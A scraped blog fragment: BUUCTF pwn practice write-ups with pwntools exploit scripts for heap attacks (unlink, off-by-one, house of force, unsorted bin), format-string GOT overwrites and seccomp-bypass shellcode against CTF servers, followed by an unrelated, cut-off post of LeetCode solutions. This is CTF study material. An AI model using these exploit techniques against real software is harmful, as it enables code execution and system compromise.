*r=remote('node3.buuoj.cn',29385)bank=0x0601080leave=0x400699puts_plt=0x04004E0puts_got=0x0601018pop_rdi=0x400703main=0x0400626ret=0x4004c9r.recvuntil('u want')payload='a'*0x60+p64(bank)+p64(leave)r.send(payload)r.recvuntil('now!')payload=p64(ret)*20+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main)r.send(payload)r.recvline()puts_addr=u64(r.recv(6).ljust(8,'\\x00'))print hex(puts_addr)libc=LibcSearcher('puts',puts_addr)libc_base=puts_addr-libc.dump('puts')one_gadget=libc_base+0x4526a#system=libc_base+libc.dump('system')#binsh=libc_base+libc.dump('str_bin_sh')#payload='a'*(0x60+8)+p64(pop_rdi)+p64(binsh)+p64(system)payload='a'*(0x60+8)+p64(one_gadget)r.send(payload)r.interactive() # hitcontraining_magicheap（unsorted bin attack) Unsorted Bin Attack，顾名思义，该攻击与 Glibc 堆管理中的的 Unsorted Bin 的机制紧密相关。 Unsorted Bin Attack 被利用的前提是控制 Unsorted Bin Chunk 的 bk 指针。 Unsorted Bin Attack 可以达到的效果是实现修改任意地址值为一个较大的数值。 释放一个不属于 fast bin 的 chunk，并且该 chunk 不和 top chunk 紧邻时，该 chunk 会被首先放到 unsorted bin 中。 初始状态时 unsorted bin 的 fd 和 bk 均指向 unsorted bin 本身。 执行 free 由于释放的 chunk 大小不属于 fast bin 范围内，所以会首先放入到 unsorted bin 中。 修改 p [1] 经过修改之后，原来在 unsorted bin 中的 p 的 bk 指针就会指向 target addr-16 处伪造的 chunk，即 Target Value 处于伪造 chunk 的 fd 处。 所以核心在于通过修改使堆块的 fd 指针指向利用的地址 - 16 # EXP 12345678910111213141516171819202122232425262728293031323334353637383940414243444546from pwn import *#p = process('./magicheap')p=remote('node4.buuoj.cn',26349)def CreateHeap(size,content): p.recvuntil(':') p.sendline('1') p.recvuntil(':') p.sendline(str(size)) p.recvuntil(':') p.sendline(content) def EditHeap(idx,size,content): p.recvuntil(':') p.sendline('2') p.recvuntil(':') p.sendline(str(idx)) p.recvuntil(':') p.sendline(str(size)) p.recvuntil(':') p.sendline(content) def DeleteHeap(idx): p.recvuntil(':') p.sendline('3') p.recvuntil(':') p.sendline(str(idx))CreateHeap(0x30,'aaaa')CreateHeap(0x80,'bbbb')CreateHeap(0x10,'cccc')DeleteHeap(1)#gdb.attach(p)magic = 0x6020A0EditHeap(0,0x50,0x30 * &quot;a&quot; + p64(0)+p64(0x91)+p64(0)+p64(magic-0x10))# 修改heap1的fd和bk指针#gdb.attach(p)CreateHeap(0x80,'dddd') #触发#gdb.attach(p)p.sendlineafter(':','4869')p.interactive() # roarctf_2019_easy_pwn（off-by-one) 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091from pwn import *r=remote('node4.buuoj.cn',26307)# r=process('roarctf_2019_easy_pwn')libc=ELF('./libc-2.23.so')context.log_level=&quot;debug&quot;def add(size): r.recvuntil('choice: ') r.sendline('1') r.recvuntil('size:') r.sendline(str(size))def edit(index,size,data): r.recvuntil('choice: ') r.sendline('2') r.recvuntil('index:') r.sendline(str(index)) r.recvuntil('size:') r.sendline(str(size)) r.recvuntil('content:') r.send(data) def delete(index): r.recvuntil('choice: ') r.sendline('3') r.recvuntil('index:') r.sendline(str(index)) def show(index): r.recvuntil('choice: ') r.sendline('4') r.recvuntil('index:') r.sendline(str(index)) malloc_hook=libc.symbols['__malloc_hook']realloc_hook=libc.symbols['realloc']print hex(malloc_hook)print hex(realloc_hook)#gdb.attach(r,&quot;b calloc&quot;)add(0x18)#idx0add(0x10)#idx1add(0x90)#idx2add(0x10)#idx3#gdb.attach(r)edit(0,34,'a'*0x10+p64(0x20)+p8(0xa1))#off by one #gdb.attach(r)edit(2,0x80,p64(0)*14+p64(0xa0)+p64(0x21))#by pass check #gdb.attach(r)delete(1)add(0x90)#idx1 chunk overlapedit(1,0x20,p64(0)*2+p64(0)+p64(0xa1))delete(2) show(1)r.recvuntil(&quot;content: &quot;)r.recv(0x20)libc_base=u64(r.recv(6).ljust(8,&quot;\\x00&quot;))-0x3c4b78print &quot;libc_base:&quot;+hex(libc_base)add(0x80)edit(1,0x90,p64(0)*2+p64(0)+p64(0x71)+p64(0)*12+p64(0x70)+p64(0x21))delete(2)edit(1,0x30,p64(0)*2+p64(0)+p64(0x71)+p64(malloc_hook+libc_base-0x23)*2)add(0x60)add(0x60)#idx4#gdb.attach(r)one_gadgets=[0x45216,0x4526a,0xf1147,0xf02a4]edit(4,27,'a'*11+p64(libc_base+one_gadgets[2])+p64(libc_base+realloc_hook+4)) add(0x60)r.interactive() # hitcontraining_heapcreator(off-by-one) 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253from pwn import *from LibcSearcher import LibcSearchersh=remote(&quot;node4.buuoj.cn&quot;,25982)# sh = process('./heapcreator')elf=ELF('./heapcreator')def create(length,value): sh.recvuntil(&quot;Your choice :&quot;) sh.sendline(&quot;1&quot;) sh.recvuntil(&quot;Size of Heap : &quot;) sh.sendline(str(int(length))) sh.recvuntil(&quot;Content of heap:&quot;) sh.sendline(value)def edit(index,value): sh.recvuntil(&quot;Your choice :&quot;) sh.sendline(&quot;2&quot;) sh.recvuntil(&quot;Index :&quot;) sh.sendline(str(int(index))) sh.recvuntil(&quot;Content of heap : &quot;) sh.sendline(value)def show(index): sh.recvuntil(&quot;Your choice :&quot;) sh.sendline(&quot;3&quot;) sh.recvuntil(&quot;Index :&quot;) sh.sendline(str(int(index)))def delete(index): sh.recvuntil('Your choice :') sh.sendline('4') sh.recvuntil('Index :') sh.sendline(str(int(index)))create(0x18,'aaaa')create(0x10,'bbbb')create(0x10,'cccc')create(0x10,'/bin/sh')edit(0,'a'*0x18+'\\x81')delete(1)size = '\\x08'.ljust(8,'\\x00')payload = 'd'*0x40+ size + p64(elf.got['free'])create(0x70,payload)show(2)sh.recvuntil('Content : ')free_addr = u64(sh.recvuntil('Done')[:-5].ljust(8,'\\x00'))libc=LibcSearcher(&quot;free&quot;,free_addr)system_addr=free_addr+libc.dump(&quot;system&quot;)-libc.dump(&quot;free&quot;)edit(2,p64(system_addr))delete(3)sh.interactive() https://blog.csdn.net/weixin_45677731/article/details/107914807 # hitcon2014_stkof(unlink) 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455from pwn import *# sh=remote(&quot;node4.buuoj.cn&quot;,28995)sh=process(&quot;./stkof&quot;)context.log_level='debug'elf=ELF('./stkof')libc=ELF('./libc-2.23.so')puts_plt=elf.plt['puts']puts_got=elf.got['puts']free=elf.got['free']ptr=0x602150def alloc(size): sh.sendline('1') sh.sendline(str(size)) sh.recvuntil('OK\\n')def edit(idx, size, content): sh.sendline('2') sh.sendline(str(idx)) sh.sendline(str(size)) sh.send(content) sh.recvuntil('OK\\n')def delete(idx): sh.sendline('3') sh.sendline(str(idx)) alloc(0x100)alloc(0x20)alloc(0x80)payload=p64(0)+p64(0x21)+p64(ptr-0x18)+p64(ptr-0x10)payload+=p64(0x20)+p64(0x90)edit(2,len(payload),payload)delete(3)sh.recvuntil('OK')payload=p64(0)+p64(0)+p64(free)+p64(ptr-0x18)+p64(puts_got)edit(2,len(payload),payload)edit(1,8,p64(puts_plt))delete(3)base = u64(sh.recv(6).ljust(8,'\\x00'))-libc.symbols['puts']sh.recvuntil('OK')system_addr=base+libc.symbols['system']payload=p64(0)+p64(0)+p64(free)+p64(ptr-0x18)+p64(ptr+0x10)+&quot;/bin/sh&quot;edit(2,len(payload),payload)edit(1,8,p64(system_addr))delete(3)sh.interactive() # zctf2016_note2(unlink) 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384#coding=utf-8from pwn import *io = remote('node4.buuoj.cn',26179)# io = process(&quot;./note2&quot;)elf = ELF(&quot;./note2&quot;)libc = ELF(&quot;./libc-2.23.so&quot;)#context.log_level = &quot;debug&quot;def new_note(size, content): io.recvuntil(&quot;&gt;&gt;&quot;) io.sendline(&quot;1&quot;) io.recvuntil(&quot;)&quot;) io.sendline(str(size)) io.recvuntil(&quot;:&quot;) io.sendline(content)def show_note(index): io.recvuntil(&quot;&gt;&gt;&quot;) io.sendline(&quot;2&quot;) io.recvuntil(&quot;:&quot;) io.sendline(str(index))def edit_note(index, choice, content): io.recvuntil(&quot;&gt;&gt;&quot;) io.sendline(&quot;3&quot;) io.recvuntil(&quot;:&quot;) io.sendline(str(index)) io.recvuntil(&quot;]&quot;) io.sendline(str(choice)) io.recvuntil(&quot;:&quot;) io.sendline(content)def delete_note(index): io.recvuntil(&quot;&gt;&gt;&quot;) io.sendline(&quot;4&quot;) io.recvuntil(&quot;:&quot;) io.sendline(str(index))io.recvuntil(&quot;:&quot;)io.sendline(&quot;/bin/sh&quot;) #nameio.recvuntil(&quot;:&quot;)io.sendline(&quot;ddd&quot;)ptr_0 = 0x602120fake_fd = ptr_0 - 0x18fake_bk = ptr_0 - 0x10note0_content = &quot;\\x00&quot; * 8 + p64(0xa1) + p64(fake_fd) + p64(fake_bk)new_note(0x80, note0_content) #note0new_note(0x0, &quot;aa&quot;) #note1new_note(0x80, &quot;/bin/sh&quot;) #note2#gdb.attach(io)delete_note(1)note1_content = &quot;\\x00&quot; * 16 + p64(0xa0) + p64(0x90)new_note(0x0, note1_content)delete_note(2) #unlink#gdb.attach(io)# 泄漏libcfree_got = elf.got[&quot;free&quot;]payload = 0x18 * &quot;a&quot; + p64(free_got)#gdb.attach(io)edit_note(0, 1, payload)#gdb.attach(io)show_note(0)io.recvuntil(&quot;is &quot;)free_addr = u64(io.recv(6).ljust(8, &quot;\\x00&quot;))libc_addr = free_addr - libc.symbols[&quot;free&quot;]print(&quot;libc address: &quot; + hex(libc_addr))#get shellsystem_addr = libc_addr + libc.symbols[&quot;system&quot;]one_gadget = libc_addr + 0xf02a4edit_note(0, 1, p64(one_gadget)) #overwrite free got -&gt; system address#io.sendlineafter('option---&gt;&gt;','/bin/sh\\x00')io.interactive() # wdb_2018_1st_babyheap(unlink,uaf) 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384from pwn import *r = remote(&quot;node4.buuoj.cn&quot;, 26136)#r = process(&quot;./wdb_2018_1st_babyheap&quot;)context(log_level = 'debug', arch = 'amd64', os = 'linux')DEBUG = 0if DEBUG: gdb.attach(r, ''' b *0x400CF7 x/10gx 0x602060 c ''')elf = ELF(&quot;./wdb_2018_1st_babyheap&quot;)libc = ELF('./libc-2.23.so')one_gadget_16 = [0x45216,0x4526a,0xf02a4,0xf1147]bss_arr = 0x602060read_got = elf.got['read']menu = &quot;Choice:&quot;def add(index, content): r.recvuntil(menu) r.sendline('1') r.recvuntil(&quot;Index:&quot;) r.sendline(str(index)) r.recvuntil(&quot;Content:&quot;) r.send(content)def delete(index): r.recvuntil(menu) r.sendline('4') r.recvuntil(&quot;Index:&quot;) r.sendline(str(index))def edit(index, content): r.recvuntil(menu) r.sendline('2') r.recvuntil(&quot;Index:&quot;) r.sendline(str(index)) r.recvuntil(&quot;Content:&quot;) r.send(content)def show(index): r.recvuntil(menu) r.sendline('3') r.recvuntil(&quot;Index:&quot;) r.sendline(str(index))sleep(3)add(0, (p64(0)+p64(0x31))*2)add(1, 'aaa\\n')add(2, 'aaa\\n')add(3, 'aaa\\n')add(4, '/bin/sh\\n')delete(0)delete(1)delete(0)show(0)heap = u64(r.recvuntil('\\n').strip().ljust(8, '\\x00')) - 0x30success(&quot;heap:&quot;+hex(heap))edit(0, p64(heap+0x10)+'\\n')add(5, p64(0) + p64(0x31) + p64(heap) + p64(bss_arr-0x10))payload = p64(bss_arr-0x18) + p64(bss_arr-0x10) + p64(0x20) + p64(0x90)add(6, payload)add(7, p64(0) + p64(0x21) + p64(bss_arr-0x18) + p64(bss_arr-0x10))delete(1)show(6)malloc_hook = u64(r.recvuntil('\\x7f').ljust(8, '\\x00')) - 0x58 - 0x10libc.address = malloc_hook - libc.sym['__malloc_hook']success(&quot;libc;&quot;+hex(libc.address))system = libc.symbols['system']free_hook = libc.sym['__free_hook']edit(0, p64(0)*3+p64(free_hook))edit(0, p64(system)+'\\n')delete(4)r.interactive() # axb_2019_fmt64（64 位格式化字符串改 got 表） 12345678910111213141516171819202122232425262728293031323334353637383940from pwn import *context.log_level = 'debug'# io = remote('node4.buuoj.cn',29964)io = process('axb_2019_fmt64')elf = ELF('./axb_2019_fmt64')#libc = elf.libclibc = ELF('./libc-2.23.so')one_gadget = [0x45216,0x4526a,0xf02a4,0xf1147]sprintf_got = elf.got['sprintf']payload = '%9$saaaa'payload += p64(sprintf_got)io.recvuntil(&quot;Please tell me:&quot;)io.sendline(payload)sprintf_addr = u64(io.recvuntil('\\x7f')[-6:].ljust(8,'\\x00'))print &quot;sprintf_addr:&quot;+hex(sprintf_addr)libcbase = sprintf_addr - libc.symbols['sprintf']one_gadget = libcbase + one_gadget[0]print &quot;one_gadget:&quot;+hex(one_gadget)payload = ''payload += '%' + str((one_gadget % 0x10000) - 9) + 'c%12$hn'payload += '%' + str(((one_gadget &gt;&gt; 16) % 0x10000) - (one_gadget % 0x10000)) + 'c%13$hn'payload = payload.ljust(0x20,'\\x00')payload += p64(sprintf_got) + p64(sprintf_got + 2)print 'payload:'+payloadio.sendline(payload)io.interactive() # pwnable_asm（沙箱) # sandbox 概述 沙盒机制也就是我们常说的沙箱，英文名 sandbox，是计算机领域的虚拟技术，常见于安全方向。一般说来，我们会将不受信任的软件放在沙箱中运行，一旦该软件有恶意行为，则禁止该程序的进一步运行，不会对真实系统造成任何危害。 在 ctf 比赛中，pwn 题中的沙盒一般都会限制 execve 的系统调用，这样一来 one_gadget 和 system 调用都不好使，只能采取 open/read/write 的组合方式来读取 flag。 一般有两种函数调用方式实现沙盒机制，第一种是采用 prctl 函数调用，第二种是使用 seccomp 库函数。 使用 seccomp-tools 检查沙盒机制，可以看到先是判断了体系架构是否是 x86_64 的，然后对系统调用号进行了判断，只允许了 read/write/open/exit 四种系统调用。 # EXP 12345678910111213141516171819#!/usr/bin/env python# -*- coding: utf-8 -*-from pwn import *import syscontext.log_level = &quot;debug&quot;context.arch = 'amd64'context.os = 'linux'sh = remote(&quot;node4.buuoj.cn&quot;,&quot;26693&quot;)# sh = process('./asm')shellcode = shellcraft.pushstr(&quot;flag&quot;)shellcode += shellcraft.open(&quot;rsp&quot;)shellcode += shellcraft.read('rax', 'rsp', 100)shellcode += shellcraft.write(1, 'rsp', 100)sh.sendlineafter(&quot;shellcode: &quot;, asm(shellcode))print sh.recvall()sh.close() 参考文章：https://blog.csdn.net/A951860555/article/details/116738676 # bctf2016_bcloud(house of force) 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859#coding:utf8from pwn import *from LibcSearcher import * #house of forcesh = process('./bcloud')# sh = remote('node4.buuoj.cn',28752)elf = ELF('./bcloud')puts_plt = elf.plt['puts']puts_got = elf.got['puts']free_got = elf.got['free']heap_array_addr = 0x0804B120sh.sendafter('Input your name:','a'*0x40)sh.recvuntil('a'*0x40)heap_addr = u32(sh.recv(4))print 'heap_addr=',hex(heap_addr)sh.sendafter('Org:','a'*0x40)#修改top chunk的sizesh.sendlineafter('Host:',p32(0xFFFFFFFF))top_chunk_addr = heap_addr + 0xD0print 'top_chunk_addr=',hex(top_chunk_addr) def add(size,content): sh.sendlineafter('option---&gt;&gt;','1') sh.sendlineafter('Input the length of the note content:',str(size)) sh.sendafter('Input the content:',content) def edit(index,content): sh.sendlineafter('option---&gt;&gt;','3') sh.sendlineafter('Input the id:',str(index)) sh.sendafter('Input the new content:',content) def delete(index): sh.sendlineafter('option---&gt;&gt;','4') sh.sendlineafter('Input the id:',str(index))offset = heap_array_addr - top_chunk_addr - 0x10add(offset,'') #0#现在top chunk移到了heap_array_addr-0x8处，我们可以控制heap_array了add(0x18,'\\n') #1 #修改heap_arrayedit(1,p32(0) + p32(free_got) + p32(puts_got) + p32(0x0804B130) + '/bin/sh\\x00')#修改free的got表为puts的plt表edit(1,p32(puts_plt) + '\\n')#泄露puts的地址delete(2)sh.recv(1)puts_addr = u32(sh.recv(4))libc = LibcSearcher('puts',puts_addr)libc_base = puts_addr - libc.dump('puts')system_addr = libc_base + libc.dump('system')print 'libc_base=',hex(libc_base)print 'system_addr=',hex(system_addr)#修改free的got表为system地址edit(1,p32(system_addr) + '\\n')#getshelldelete(3) sh.interactive() 参考文章 https://snappyjack.github.io/articles/2019-12/BCTF2016_bcloud https://blog.csdn.net/csdn546229768/article/details/122725993","link":"/2022/02/18/BUUCTF%20Pwn%20Exercise/"},{"title":"leetcode数据结构刷题(一)","text":"Leetcode 数据结构练习 # 数组 # 最大子序和 思路：动态规划 12345678910class Solution { public int maxSubArray(int[] nums) { int pre = 0,maxn = nums[0]; for (int x:nums){ pre = Math.max(pre+x,x); maxn = Math.max(pre,maxn); } return maxn; }} # 两数之和 哈希表降时间复杂度从 o (n) 到 o (1) 创建一个哈希表，对于每一个 x ，我们首先查询哈希表中是否存在 target - x ，然后将 x 插入到哈希表中，即可保证不会让 x 和自己匹配。 123456789101112class Solution { public int[] twoSum(int[] nums, int target) { Map&lt;Integer, Integer&gt; hashtable = new HashMap&lt;Integer, Integer&gt;(); for (int i = 0; i &lt; nums.length; ++i) { if (hashtable.containsKey(target - nums[i])) { return new int[]{hashtable.get(target - nums[i]), i}; } hashtable.put(nums[i], i); } return new int[0]; }} # 合并两个有序数组 给你两个按 非递减顺序 排列的整数数组 nums1 和 nums2，另有两个整数 m 和 n ，分别表示 nums1 和 nums2 中的元素数目。 请你 合并 nums2 到 nums1 中，使合并后的数组同样按 非递减顺序 排列。 注意：最终，合并后数组不应由函数返回，而是存储在数组 nums1 中。为了应对这种情况，nums1 的初始长度为 m + n，其中前 m 个元素表示应合并的元素，后 n 个元素为 0 ，应忽略。nums2 的长度为 n 。 示例 1： 输入：nums1 = [1,2,3,0,0,0], m = 3, nums2 = [2,5,6], n = 3 输出：[1,2,2,3,5,6] 解释：需要合并 [1,2,3] 和 [2,5,6] 。 合并结果是 [1,2,2,3,5,6] ，其中斜体加粗标注的为 nums1 中的元素。 示例 2： 输入：nums1 = [1], m = 1, nums2 = [], n = 0 输出：[1] 解释：需要合并 [1] 和 [] 。 合并结果是 [1] 。 示例 3： 输入：nums1 = [0], m = 0, nums2 = [1], n = 1 输出：[1] 解释：需要合并的数组是 [] 和 [1] 。 合并结果是 [1] 。 注意，因为 m = 0 ，所以 nums1 中没有元素。nums1 中仅存的 0 仅仅是为了确保合并结果可以顺利存放到 nums1 中。 exp 一、双指针 123456789101112131415161718192021222324class Solution {public: void merge(vector&lt;int&gt;&amp; nums1, int m, vector&lt;int&gt;&amp; nums2, int n) { int p1 = 0, p2 = 0; int sorted[m + n]; int cur; while (p1 &lt; m || p2 &lt; n) { if (p1 == m) { cur = nums2[p2++]; } else if (p2 == n) { cur = nums1[p1++]; } else if (nums1[p1] &lt; nums2[p2]) { cur = nums1[p1++]; } else { cur = nums2[p2++]; } sorted[p1 + p2 - 1] = cur; } for (int i = 0; i != m + n; ++i) { nums1[i] = sorted[i]; } }}; 复杂度分析 时间复杂度：O (m+n) 指针移动单调递增，最多移动 m+n 次，因此时间复杂度为 O (m+n)。 空间复杂度：O (m+n)。 需要建立长度为 m+n 的中间数组 sorted。 二、逆向双指针 从后向前遍历，将两者较大的元素放在 nums 数组的后面而不会被覆盖，降低了空间复杂度为 O (1) 1234567891011121314151617181920class Solution {public: void merge(vector&lt;int&gt;&amp; nums1, int m, vector&lt;int&gt;&amp; nums2, int n) { int p1 = m - 1, p2 = n - 1; int tail = m + n - 1; int cur; while (p1 &gt;= 0 || p2 &gt;= 0) { if (p1 == -1) { cur = nums2[p2--]; } else if (p2 == -1) { cur = nums1[p1--]; } else if (nums1[p1] &gt; nums2[p2]) { cur = nums1[p1--]; } else { cur = nums2[p2--]; } nums1[tail--] = cur; } }}; # 两个数组的交集 一、哈希表 1234567891011121314151617181920212223class Solution {public: vector&lt;int&gt; intersect(vector&lt;int&gt;&amp; nums1, vector&lt;int&gt;&amp; nums2) { if (nums1.size() &gt; nums2.size()) { return intersect(nums2, nums1); } unordered_map &lt;int, int&gt; m; for (int num : nums1) { ++m[num]; } vector&lt;int&gt; intersection; for (int num : nums2) { if (m.count(num)) { intersection.push_back(num); --m[num]; if (m[num] == 0) { m.erase(num); } } } return intersection; }}; 时间复杂度：O (m+n), 空间复杂度：O (min (m,n)) 二、双指针排序 12345678910111213141516171819202122232425262728```### 买卖股票的最佳时机&gt;输入：[7,1,5,3,6,4]&gt;输出：5&gt;解释：在第 2 天（股票价格 = 1）的时候买入，在第 5 天（股票价格 = 6）的时候卖出，最大利润 = 6-1 = 5 。&gt; 注意利润不能是 7-1 = 6, 因为卖出价格需要大于买入价格；同时，你不能在买入前卖出股票。exp:**动态规划**(来自题解）考虑每次如何获取最大收益，第i天的最大收益通过前i天的最低点就可以算出来。而第i天以前（包括第i天）的最低点和i-1天的最低点有关，因此动态方程为dp[i] = min(d[i-1],prices[i])其中dp[0]=prices[0],然后动态计算之后的就可以了。 得到了前i天的最低点以后，只需要维护一个max用来保存最大收益就可以了。 时间复杂度为O(n),一次遍历，空间复杂度O（n）的动态规划，代码如下：```java //dp[i]表示截止到i，价格的最低点是多少 dp[i]=min(dp[i-1],nums[i]) int max = 0; int[] dp = new int[prices.length]; dp[0] = prices[0]; for (int i = 1; i &lt; prices.length; i++) { dp[i] = (dp[i - 1] &lt; prices[i]) ? dp[i - 1] : prices[i]; max = (prices[i] - dp[i]) &gt; max ? prices[i] - dp[i] : max; } return max; 接着考虑优化空间，仔细观察动态规划的辅助数组，其实每一次只用到了 dp [-1] 这一个空间，因此可以把数组改成单个变量 dp 来存储截止到第 i 天的价格最低点。优化之后的代码就是题解中的方法二。 12345678910111213class Solution {public: int maxProfit(vector&lt;int&gt;&amp; prices) { int inf = 1e9; int minprice = inf, maxprofit = 0; for (int price: prices) { maxprofit = max(maxprofit, price - minprice); minprice = min(price, minprice); } return maxprofit; }}; 时间复杂度 O (n), 空间复杂度 O (1) # 树和二叉树 # 二叉树的深度 输入一棵二叉树的根节点，求该树的深度。从根节点到叶节点依次经过的节点（含根、叶节点）形成树的一条路径，最长路径的长度为树的深度。 例如： 给定二叉树 [3,9,20,null,null,15,7]， ​ 3 / 9 20 / 15 7 返回它的最大深度 3 。 # 法一：DFS 树的深度等于左子树的深度和右子树深度的最大值 + 1 12345678910111213141516171819/** * Definition for a binary tree node. * struct TreeNode { * int val; * TreeNode *left; * TreeNode *right; * TreeNode(int x) : val(x), left(NULL), right(NULL) {} * }; */class Solution {public: int maxDepth(TreeNode* root) { if(root==nullptr) return 0; int leftdeep=maxDepth(root-&gt;left); int rightdeep = maxDepth(root-&gt;right); return max(leftdeep,rightdeep)+1; }}; # 对称二叉树 请实现一个函数，用来判断一棵二叉树是不是对称的。如果一棵二叉树和它的镜像一样，那么它是对称的。 例如，二叉树 [1,2,2,3,4,4,3] 是对称的。 1 / 2 2 / \\ / 3 4 4 3 但是下面这个 [1,2,2,null,3,null,3] 则不是镜像对称的: 1 / 2 2 \\ 3 3 题解： 双指针递归剪枝，结束条件为左右指针同时都为空指针返回 true，如果值不同或只有一个为空返回 false 12345678910111213141516171819202122232425262728/** * Definition for a binary tree node. * struct TreeNode { * int val; * TreeNode *left; * TreeNode *right; * TreeNode(int x) : val(x), left(NULL), right(NULL) {} * }; */class Solution {public: bool isSymmetric(TreeNode* root) { if(root==NULL) return true; TreeNode *l=root; TreeNode *r=root; return recv(l,r); } bool recv(TreeNode * l,TreeNode *r){ if(l==NULL&amp;&amp;r==NULL) return true; if(l==NULL||r==NULL||l-&gt;val!=r-&gt;val) return false; //上面两个位置不能调换 return recv(l-&gt;left,r-&gt;right)&amp;&amp;recv(l-&gt;right,r-&gt;left); }}; # 平衡二叉树 平衡二叉树的定义是：二叉树的每个节点的左右子树的高度差的绝对值不超过 11，则二叉树是平衡二叉树。根据定义，一棵二叉树是平衡二叉树，当且仅当其所有子树也都是平衡二叉树，因此可以使用递归的方式判断二叉树是不是平衡二叉树，递归的顺序可以是自顶向下或者自底向上。 # 法一： 自顶向下递归 123456789101112131415161718class Solution {public: int height(TreeNode* root) { if (root == NULL) { return 0; } else { return max(height(root-&gt;left), height(root-&gt;right)) + 1; } } bool isBalanced(TreeNode* root) { if (root == NULL) { return true; } else { return abs(height(root-&gt;left) - height(root-&gt;right)) &lt;= 1 &amp;&amp; isBalanced(root-&gt;left) &amp;&amp; isBalanced(root-&gt;right); } }}; 复杂度分析 时间复杂度：O (n^2)，其中 n 是二叉树中的节点个数。 最坏情况下，二叉树是满二叉树，需要遍历二叉树中的所有节点，时间复杂度是 O (n)。 对于节点 p，如果它的高度是 d，则 \\texttt {height}§height§ 最多会被调用 dd 次（即遍历到它的每一个祖先节点时）。对于平均的情况，一棵树的高度 h 满足 O (h)=O (\\log n) O (h)=O (logn)，因为 d \\leq hd≤h，所以总时间复杂度为 O (n \\log n)。对于最坏的情况，二叉树形成链式结构，高度为 O (n)，此时总时间复杂度为 O (n^2) 空间复杂度：O (n)，其中 n 是二叉树中的节点个数。空间复杂度主要取决于递归调用的层数，递归调用的层数不会超过 n。 # 法二： 自底向上递归 1234567891011121314151617181920class Solution {public: int height(TreeNode* root) { if (root == NULL) { return 0; } int leftHeight = height(root-&gt;left); int rightHeight = height(root-&gt;right); if (leftHeight == -1 || rightHeight == -1 || abs(leftHeight - rightHeight) &gt; 1) { return -1; } else { return max(leftHeight, rightHeight) + 1; } } bool isBalanced(TreeNode* root) { return height(root) &gt;= 0; }}; 复杂度分析 时间复杂度：O (n)，其中 n 是二叉树中的节点个数。使用自底向上的递归，每个节点的计算高度和判断是否平衡都只需要处理一次，最坏情况下需要遍历二叉树中的所有节点，因此时间复杂度是 O (n)。 空间复杂度：O (n)，其中 n 是二叉树中的节点个数。空间复杂度主要取决于递归调用的层数，递归调用的层数不会超过 n。 # 二叉树剪枝 后序遍历 dfs 12345678910111213141516171819202122232425/** * Definition for a binary tree node. * struct TreeNode { * int val; * TreeNode *left; * TreeNode *right; * TreeNode() : val(0), left(nullptr), right(nullptr) {} * TreeNode(int x) : val(x), left(nullptr), right(nullptr) {} * TreeNode(int x, TreeNode *left, TreeNode *right) : val(x), left(left), right(right) {} * }; */class Solution {public: TreeNode* pruneTree(TreeNode* root) { if(root == NULL) return NULL; TreeNode *leftnode = pruneTree(root-&gt;left); TreeNode *rightnode = pruneTree(root-&gt;right); if(root-&gt;val==0 &amp;&amp; leftnode==NULL&amp;&amp;rightnode == NULL ) return nullptr; root-&gt;left = leftnode; root-&gt;right= rightnode; return root; } }; # 寻找最近公共祖先 # 法一：递归 12345678910111213141516171819class Solution {public: TreeNode* ans; bool dfs(TreeNode* root, TreeNode* p, TreeNode* q) { if (root == nullptr) return false; bool lson = dfs(root-&gt;left, p, q); bool rson = dfs(root-&gt;right, p, q); if ((lson &amp;&amp; rson) || ((root-&gt;val == p-&gt;val || root-&gt;val == q-&gt;val) &amp;&amp; (lson || rson)))//lson&amp;&amp;rson表示左右子树均包含p或q节点，root恰好是p或q且它的左子树或右子树有一个包含了另一个节点的情况 { ans = root; } return lson || rson || (root-&gt;val == p-&gt;val || root-&gt;val == q-&gt;val); } TreeNode* lowestCommonAncestor(TreeNode* root, TreeNode* p, TreeNode* q) { dfs(root, p, q); return ans; }}; # 法二：存储父节点 从根节点开始遍历整棵二叉树，用哈希表记录每个节点的父节点指针。 从 p 节点开始不断往它的祖先移动，并用数据结构记录已经访问过的祖先节点。 同样，我们再从 q 节点开始不断往它的祖先移动，如果有祖先已经被访问过，即意味着这是 p 和 q 的深度最深的公共祖先，即 LCA 节点。 1234567891011121314151617181920212223242526272829class Solution {public: unordered_map&lt;int, TreeNode*&gt; fa; unordered_map&lt;int, bool&gt; vis; void dfs(TreeNode* root){ if (root-&gt;left != nullptr) { fa[root-&gt;left-&gt;val] = root; dfs(root-&gt;left); } if (root-&gt;right != nullptr) { fa[root-&gt;right-&gt;val] = root; dfs(root-&gt;right); } } TreeNode* lowestCommonAncestor(TreeNode* root, TreeNode* p, TreeNode* q) { fa[root-&gt;val] = nullptr; dfs(root); while (p != nullptr) { vis[p-&gt;val] = true; p = fa[p-&gt;val]; } while (q != nullptr) { if (vis[q-&gt;val]) return q; q = fa[q-&gt;val]; } return nullptr; }}; # 二叉搜索树 输入一棵二叉搜索树，将该二叉搜索树转换成一个排序的循环双向链表。要求不能创建任何新的节点，只能调整树中节点指针的指向。 为了让您更好地理解问题，以下面的二叉搜索树为例： 我们希望将这个二叉搜索树转化为双向循环链表。链表中的每个节点都有一个前驱和后继指针。对于双向循环链表，第一个节点的前驱是最后一个节点，最后一个节点的后继是第一个节点。 下图展示了上面的二叉搜索树转化成的链表。“head” 表示指向链表中有最小元素的节点。 特别地，我们希望可以就地完成转换操作。当转化完成以后，树中节点的左指针需要指向前驱，树中节点的右指针需要指向后继。还需要返回链表中的第一个节点的指针。 思路： 二叉搜索树 转换成一个 “排序的循环双向链表” ，其中包含三个要素： 排序链表： 节点应从小到大排序，因此应使用 中序遍历 “从小到大” 访问树的节点。 双向链表： 在构建相邻节点的引用关系时，设前驱节点 pre 和当前节点 cur ，不仅应构建 pre.right = cur ，也应构建 cur.left = pre 。 循环链表： 设链表头节点 head 和尾节点 tail ，则应构建 head.left = tail 和 tail.right = head 。 算法流程 dfs (cur): 递归法中序遍历； 终止条件： 当节点 cur 为空，代表越过叶节点，直接返回； 递归左子树，即 dfs (cur.left) ； 构建链表： 当 pre 为空时： 代表正在访问链表头节点，记为 head ； 当 pre 不为空时： 修改双向节点引用，即 pre.right = cur ， 